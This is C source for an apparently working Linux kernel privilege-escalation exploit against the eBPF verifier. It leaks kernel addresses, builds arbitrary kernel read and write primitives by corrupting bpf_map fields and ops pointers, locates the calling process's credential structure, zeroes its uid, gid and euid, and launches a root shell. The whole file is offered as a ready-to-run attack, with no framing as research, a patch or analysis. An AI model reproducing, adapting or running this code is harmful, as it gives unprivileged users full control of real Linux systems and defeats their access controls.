#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/bpf.h>

#define BPF_ROL 0xe0

#include "bpf_defs.h"
#include "kernel_defs.h"
#include "kmem_search.h"
#include "exploit_configs.h"


int kernel_write_uint(exploit_context* pCtx, uint64_t addr, uint32_t val)
{
    int ret = -1;
    char vals[ARRAY_MAP_SIZE] = {0};

    // addr will be set to index(val) + 1 in array_map_get_next_key
    val -=1;

    memcpy(vals, &val, sizeof(uint32_t));

    if(0 != update_map_element(pCtx->oob_map_fd, 0, vals, addr))
    {
        printf("[-] kernel write failed!\n");
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int kernel_write(exploit_context* pCtx, uint64_t addr, char* buffer, uint32_t len)
{
    int ret = -1;

    for(uint32_t i = 0; i < len; i += sizeof(uint32_t))
    {
    	addr += i;
        uint32_t val = *(uint32_t*)(buffer + i);

        if(0 != kernel_write_uint(pCtx, addr, val))
        {
            goto done;
        }
    }

    ret = 0;

done:
    return ret; 
}

void cleanup_read(exploit_context* pCtx)
{
    struct bpf_insn insn[] =
    {
		generate_buggy_reg(pCtx->oob_map_fd, pCtx->store_map_fd),
		BPF_MOV64_IMM(BPF_REG_8, 0x3),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_4),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x400),
		BPF_ALU64_REG(BPF_ADD, OOB_MAP_REG, BPF_REG_8), //Spec-Ex trigger after think, where OOB_MAP_REG and BPF_REG_8 revert to unknowns
		BPF_ALU64_IMM(BPF_ADD, OOB_MAP_REG, -0x4b0), //btf ptr is at offset -0x80, and we're already at offset 0x400

        BPF_MOV64_IMM(CONST_REG, 0x0),
        BPF_STX_MEM(BPF_DW, OOB_MAP_REG, CONST_REG, 0),
        BPF_EXIT_INSN()
    };

    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), NULL))
    {
        printf("[-] warning, failed to run cleanup read BPF program!\n");
    }

    pCtx->state = EXPLOIT_STATE_CLEAN;
}


void cleanup_write(exploit_context* pCtx)
{
    uint64_t null = 0;
    int ret;

    // restore bpf_map->max_entries = 1
    ret = kernel_write_uint(pCtx, pCtx->oob_map_ptr - BPF_MAP_MAX_ENTRIES_OFFSET, 1);

    // claim !map_value_has_spin_lock()
    ret |= kernel_write_uint(pCtx, pCtx->oob_map_ptr - BPF_MAP_SPIN_LOCK_OFF_OFFSET, -1);

    // restore bpf_map->btf = NULL
    ret |= kernel_write(pCtx, pCtx->oob_map_ptr - BPF_MAP_BTF_OFFSET, (char*)&null, sizeof(uint64_t));

    // restore bpf_map->map_type = BPF_MAP_TYPE_ARRAY
    if(ret | kernel_write_uint(pCtx, pCtx->oob_map_ptr - BPF_MAP_TYPE_OFFSET, BPF_MAP_TYPE_ARRAY))
        printf("[-] warning, cleanup failed! this will cause instability...\n");

    // We don't restore the rest of the values. However, this is enough to exit cleanly.

    pCtx->state = EXPLOIT_STATE_CLEAN;
}

void cleanup(exploit_context* pCtx)
{
    switch(pCtx->state)
    {
        case EXPLOIT_STATE_READ:
            cleanup_read(pCtx);
            break;
        case EXPLOIT_STATE_WRITE:
            cleanup_write(pCtx);
            break;
        case EXPLOIT_STATE_CLEAN:
        default:
        break;
    }
}



int prepare_kernel_write(exploit_context* pCtx)
{
    int ret = -1;
    char array_map_ops[0x1000] = {0};
    uint64_t array_map_get_next_key = 0;

    struct bpf_insn insn[] =
    {
		generate_buggy_reg(pCtx->oob_map_fd, pCtx->store_map_fd),

        //Create copy of OOB_MAP_REG if we need
        BPF_MOV64_REG(BPF_REG_9, OOB_MAP_REG),

        // load oob map values pointer in leak register
        BPF_LD_IMM64(LEAK_VAL_REG, pCtx->oob_map_ptr),

        // subtract BPF_MAP_OPS_OFFSET from oob map value pointer, so it points 
        // to bpf_map->ops
		BPF_MOV64_IMM(BPF_REG_8, 0x3),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_4),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x400),
		BPF_ALU64_REG(BPF_ADD, OOB_MAP_REG, BPF_REG_8), //Spec-Ex trigger after think, where OOB_MAP_REG and BPF_REG_8 revert to unknowns
		BPF_ALU64_IMM(BPF_ADD, OOB_MAP_REG, -0x500), //ops `ptr is at offset -0x100, and we're already at offset 0x400 (Verifier thinks we;re at 0x300, 0x700)
        // overwrite bpf_map->ops to point to the first value in oob map, where we store
        // fake bpf_map_ops structure
        BPF_STX_MEM(BPF_DW,  OOB_MAP_REG, LEAK_VAL_REG, 0),


        //Add to OOB_MAP_REG  so it points to bpf_map->spin_lock (which is at offset 200 from the start of `bpf_map`, which is where we are)
        BPF_ALU64_IMM(BPF_ADD, OOB_MAP_REG, 200), //verifier thinks map off is (0x300+200, 0x700+200)
        // set constant register to 0
        BPF_MOV64_IMM(CONST_REG, 0x0),
        // set bpf_map->spin_lock_off = 0 to bypass checks 
        BPF_STX_MEM(BPF_W, OOB_MAP_REG, CONST_REG, 0),


        // set constant register to 0xFFFFFFFF
        BPF_MOV64_IMM(CONST_REG, 0xFFFFFFFF),
        //OOB_MAP_REG currently at &bpf_map->lock. Subtract 164, so we point 
        // to bpf_map->max_entries
        BPF_ALU64_IMM(BPF_SUB, OOB_MAP_REG, 164), //verifier thinksmap off is (0x300+36, 0x700+36)
        // set bpf_map->max_entries = 0xFFFFFFFF 
        BPF_STX_MEM(BPF_W, OOB_MAP_REG, CONST_REG, 0),


        // set constant register to BPF_MAP_TYPE_STACK
        BPF_MOV64_IMM(CONST_REG, BPF_MAP_TYPE_STACK),
        //OOB_MAP points of &bpf_map->max entries. subtract 12 to point it at &bpf_map->map_type
        BPF_ALU64_IMM(BPF_SUB, OOB_MAP_REG, 12), //verifier thinks map off is (0x300+12, 0x700+12)
        // set bpf_map->map_type = BPF_MAP_TYPE_STACK to be able to call map_push_elem
        BPF_STX_MEM(BPF_W, OOB_MAP_REG, CONST_REG, 0),


        // set constant register to BPF_MAP_TYPE_STACK
        BPF_ALU64_IMM(BPF_ADD, LEAK_VAL_REG, 0x800),
        //OOB_MAP points of &bpf_map->max entries. Add 32 so we point to at &bpf_map->record
        BPF_ALU64_IMM(BPF_ADD, OOB_MAP_REG, 32), 
        // set bpf_map->record to &oob_map[0x800]. Theres a field at offset 4 that must have the bottom bit set, so oob_map[0x804] = 1
        BPF_STX_MEM(BPF_DW, OOB_MAP_REG, LEAK_VAL_REG, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    if(0 != kernel_read(pCtx, pCtx->array_map_ops, array_map_ops, BPF_MAP_OPS_OFFSET))
    {
        goto done;
    }

    memcpy(&array_map_get_next_key, &array_map_ops[MAP_OPS_GET_NEXT_KEY_OFFSET], sizeof(uint64_t));

    if(!IS_KERNEL_POINTER(array_map_get_next_key))
    {
        goto done;
    }

    memcpy(&array_map_ops[MAP_OPS_PUSH_ELEM_OFFSET], &array_map_get_next_key, sizeof(uint64_t));

    //So that map->record is happy
    array_map_ops[0x804] = 1;

    

    if(0 != update_map_element(pCtx->oob_map_fd, 0, array_map_ops, BPF_ANY))
    {
        printf("[-] failed to update map element values!\n");
        goto done;
    }

    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), NULL))
    {
        printf("[-] failed to run eBPF program!\n");
        goto done;
    }

    pCtx->state = EXPLOIT_STATE_WRITE;

    ret = 0;

done:
    return ret;
}

int overwrite_cred(exploit_context* pCtx)
{
    int ret = -1;

    if(0 != kernel_write_uint(pCtx, pCtx->cred + CRED_UID_OFFSET, 0))
    {
        goto done;
    }

    if(0 != kernel_write_uint(pCtx, pCtx->cred + CRED_GID_OFFSET, 0))
    {
        goto done;
    }

    if(0 != kernel_write_uint(pCtx, pCtx->cred + CRED_EUID_OFFSET, 0))
    {
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int kernel_read_uint(exploit_context* pCtx, uint64_t addr, uint32_t* puiData)
{
    int ret = -1;
    char vals[ARRAY_MAP_SIZE] = {0};
    uint64_t btf_addr = addr - BTF_ID_OFFSET;
    struct bpf_map_info_kernel info = {0};
    union bpf_attr attrs = 
    {
        .info.bpf_fd = pCtx->oob_map_fd,
        .info.info = (long long unsigned int)&info,
        .info.info_len = sizeof(info)
    };

    struct bpf_insn insn[] =
    {
		generate_buggy_reg(pCtx->oob_map_fd, pCtx->store_map_fd),
		BPF_MOV64_IMM(BPF_REG_8, 0x3),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_4),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x400),
		BPF_ALU64_REG(BPF_ADD, OOB_MAP_REG, BPF_REG_8), //Spec-Ex trigger after think, where OOB_MAP_REG and BPF_REG_8 revert to unknowns
		BPF_ALU64_IMM(BPF_ADD, OOB_MAP_REG, -0x4b0), //btf ptr is at offset -0x80, and we're already at offset 0x400

        // load the leak address from store map
        BPF_LDX_MEM(BPF_DW, LEAK_VAL_REG, STORE_MAP_REG, 16),
        // set bpf_map->btf = leak address. using BPF syscall with command 
        // BPF_OBJ_GET_INFO_BY_FD will return the value of bpf_map->btf->id
        BPF_STX_MEM(BPF_DW, OOB_MAP_REG, LEAK_VAL_REG, 0),
        BPF_EXIT_INSN()
    };

    ((uint64_t*)vals)[1] = 0;
    ((uint64_t*)vals)[2] = btf_addr;


    if(0 != update_map_element(pCtx->store_map_fd, 0, vals, BPF_ANY))
    {
        printf("[-] failed to update map element values!\n");
        goto done;
    }

    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), &pCtx->prog_fd))
    {
        printf("[-] failed to run eBPF program!\n");
        goto done;
    }

    if(0 != obj_get_info_by_fd(&attrs))
    {
        printf("[-] failed to leak memory with BPF_OBJ_GET_INFO_BY_FD \n");
        goto done;
    }

    *puiData = info.btf_id;
    ret = 0;

done:
    return ret;
}

int kernel_read(exploit_context* pCtx, uint64_t addr, char* buffer, uint32_t len)
{
    int ret = -1;

    for(uint32_t i = 0; i < len; i += sizeof(uint32_t))
    {
        uint32_t val = 0;

        if(0 != kernel_read_uint(pCtx, addr + i, &val))
        {
            goto done;
        }

        *(uint32_t*)(buffer + i) = val;
    }

    ret = 0;

done:
    return ret; 
}

int create_bpf_maps(exploit_context* pCtx)
{
    int ret = -1;
    int oob_map_fd = -1;
    int store_map_fd = -1;
    char vals[ARRAY_MAP_SIZE] = {0};
    union bpf_attr map_attrs =
    {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = ARRAY_MAP_SIZE,
        .max_entries = 1,
    };

    oob_map_fd = create_map(&map_attrs);
    store_map_fd = create_map(&map_attrs);

    if((oob_map_fd < 0) || (store_map_fd) < 0)
    {
        printf("[-] failed to create bpf array map!\n");
        goto done;
    }

    if(0 != update_map_element(oob_map_fd, 0, vals, BPF_ANY))
    {
        printf("[-] failed to update map element values!\n");
        goto done;
    }

    if(0 != update_map_element(store_map_fd, 0, vals, BPF_ANY))
    {
        printf("[-] failed to update map element values!\n");
        goto done;
    }

    pCtx->oob_map_fd = oob_map_fd;
    pCtx->store_map_fd = store_map_fd;

    ret = 0;

done:
    return ret;
}

int leak_oob_map_ptr(exploit_context* pCtx)
{
    int ret = -1;
    char vals[ARRAY_MAP_SIZE] = {0};
    struct bpf_insn insn[] =
    {
		load_maps(pCtx->oob_map_fd, pCtx->store_map_fd)

		BPF_LDX_MEM(BPF_DW, BPF_REG_4, STORE_MAP_REG, 8), //Load map value in BPF_REG_4 (fully uknown)
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 0x4), //ADd 4 to it (still fully unknown bc integer overflows)

		BPF_ALU64_IMM(BPF_AND, BPF_REG_4, 0x7),  //The upper 61bits of REG2 are 0s, the bottom3 are unknown
		BPF_JMP_IMM(BPF_JLT, BPF_REG_4, 2, 3), //Go die if we're less than2 (we arent)
		BPF_ALU64_IMM(BPF_ROL, BPF_REG_4, 62), //reg is in a weird state, if we add a map-ptr to it the map-ptr becomes a scalar??

        // adding a register with invalid bounds to a pointer causes the verifier to 
        // mark it as an unbounded value, so we are able to leak its value by saving it
        // in the store map
        BPF_ALU64_REG(BPF_SUB, OOB_MAP_REG, EXPLOIT_REG),
		BPF_STX_MEM(BPF_DW, STORE_MAP_REG, OOB_MAP_REG, 8),

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
    };

    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), NULL))
    {
        printf("[-] failed to run eBPF program!\n");
        goto done;
    }

    if(0 != lookup_map_element(pCtx->store_map_fd, 0, vals))
    {
        printf("[-] failed to retrieve storage map element!\n");
        goto done;
    }

    memcpy(&pCtx->oob_map_ptr, &vals[sizeof(uint64_t)], sizeof(uint64_t));
    pCtx->oob_map_ptr += 1; //We subtracted one in the prog so fix that here

    if(!IS_KERNEL_POINTER(pCtx->oob_map_ptr))
    {
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int leak_array_map_ops(exploit_context* pCtx)
{
    int ret = -1;
    char vals[ARRAY_MAP_SIZE] = {0};
	if (update_map_element(pCtx->store_map_fd, 0, vals, BPF_ANY)) {
		fprintf(stderr, "Couldnt update map vals\n");
	}

    struct bpf_insn insn[] =
    {
		generate_buggy_reg(pCtx->oob_map_fd, pCtx->store_map_fd),

		//REG_4 = 2, verifier thinks (1,0)
		//REG_8 = 1, verifier thinks (3,2)

		BPF_MOV64_IMM(BPF_REG_8, 0x3),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_4),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x400),
		BPF_ALU64_REG(BPF_ADD, OOB_MAP_REG, BPF_REG_8), //Spec-Ex trigger after think, where OOB_MAP_REG and BPF_REG_8 revert to unknowns
		BPF_ALU64_IMM(BPF_ADD, OOB_MAP_REG, -0x500), //array_map_ops is at offset -0x100, and we're already at offset 0x400

		BPF_LDX_MEM(BPF_DW, LEAK_VAL_REG, OOB_MAP_REG, 0),
		BPF_STX_MEM(BPF_DW, STORE_MAP_REG, LEAK_VAL_REG, 8),


		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
    };

    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), NULL))
    {
        printf("[-] failed to run eBPF program!\n");
        goto done;
    }

    if(0 != lookup_map_element(pCtx->store_map_fd, 0, vals))
    {
        printf("[-] failed to retrieve storage map element!\n");
        goto done;
    }

    memcpy(&pCtx->array_map_ops, &vals[sizeof(uint64_t)], sizeof(uint64_t));

    if(!IS_KERNEL_POINTER(pCtx->array_map_ops))
    {
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int test_kernel_read(exploit_context* pCtx)
{
    int ret = -1;
    uint64_t kernel_addr = 0;

    pCtx->state = EXPLOIT_STATE_READ;

    if(0 != kernel_read(pCtx, pCtx->array_map_ops, (char*)&kernel_addr, sizeof(uint64_t)))
    {
        goto done;
    }


    if(!IS_KERNEL_POINTER(kernel_addr))
    {
        goto done;
    }

    ret = 0;  
    
done:
    return ret;
}

int main(int argc, char **argv)
{
    exploit_context ctx = {0};
    pid_t current_pid = getpid();

    if(0 != create_bpf_maps(&ctx))
    {
        printf("[-] failed to create bpf maps!\n");
        goto done;
    }

    printf("[+] eBPF enabled, maps created!\n");

    if(0 != leak_oob_map_ptr(&ctx))
    {
        printf("[-] failed to leak ptr to BPF map!\n");
        goto done;
    }

    printf("[+] addr of oob BPF array map: %lx\n", ctx.oob_map_ptr);

    if (0 != leak_array_map_ops(&ctx))
    {
        printf("[-] failed to leak address of array_map_ops!\n");
        goto done;
    }

    printf("[+] addr of array_map_ops: %lx\n", ctx.array_map_ops);

    if(0 != test_kernel_read(&ctx))
    {
        printf("[-] kernel read failed!\n");
        goto done;
    }

    printf("[+] kernel read successful!\n");
    printf("[!] searching for init_pid_ns in kstrtab ...\n");

    if(0 !=  search_init_pid_ns_kstrtab(&ctx))
    {
        printf("[-] failed to find init_pid_ns in kstrtab!\n");
        goto done;
    }


    printf("[+] addr of init_pid_ns in kstrtab: %lx\n", ctx.init_pid_ns_kstrtab);
    printf("[!] searching for init_pid_ns in ksymtab...\n");

    if(0 != search_init_pid_ns_ksymtab(&ctx))
    {
        printf("[-] failed to find init_pid_ns in ksymtab!\n");
        goto done;
    }

    //Without KASLR these are the correct values (or were at least), because the scan can take ages
    //ctx.init_pid_ns_kstrtab = 0xffffffff82b1bf40;
    //ctx.init_pid_ns = 0xffffffff832548e0;

    printf("[+] addr of init_pid_ns %lx\n", ctx.init_pid_ns);
    printf("[!] searching for creds for pid: %0x\n", current_pid);

    if(0 != find_pid_cred(&ctx, current_pid))
    {
        printf("[-] failed to find addr of current creds!\n");
        goto done;
    }

    printf("[+] addr of cred structure: %lx\n", ctx.cred);

    if(0 != prepare_kernel_write(&ctx))
    {
        printf("[-] failed to set up maps for kernel write!\n");
        goto done;
    }

    printf("[!] preparing to overwrite creds...\n");

    if(0 != overwrite_cred(&ctx))
    {
        printf("[-] LPE failed :(\n");
        goto done;
    }

    cleanup(&ctx);

    printf("[+] success! enjoy r00t :)\n");
    system("sh");

done:
    cleanup(&ctx);
    return 0;
}
